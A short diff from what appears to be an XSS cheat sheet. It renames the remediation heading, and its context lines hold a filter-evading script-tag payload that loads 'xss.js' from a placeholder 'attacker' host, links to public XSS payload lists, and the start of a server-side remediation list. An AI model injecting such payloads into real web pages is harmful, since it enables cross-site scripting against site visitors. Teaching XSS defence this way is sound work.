@@ -73,7 +73,7 @@ http://example/?var=<SRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>
    - https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt
    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection
 
-## XSS - Remediation     
+## ⛑️ Remediation     
 ### - Server-Side validation
 1. [x] ***X-XSS-Protection***
 ```
